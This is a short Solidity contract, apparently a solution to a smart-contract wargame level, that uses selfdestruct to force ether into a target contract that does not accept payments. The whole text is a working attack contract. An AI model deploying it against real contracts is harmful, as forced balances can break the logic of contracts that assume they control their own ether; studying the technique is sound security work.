
contract AttackForce {
    address payable target;

    constructor(address payable _target) {
        target = _target;
    }

    receive() external payable {}

    function destroy() public payable {
        selfdestruct(target);
    }
}
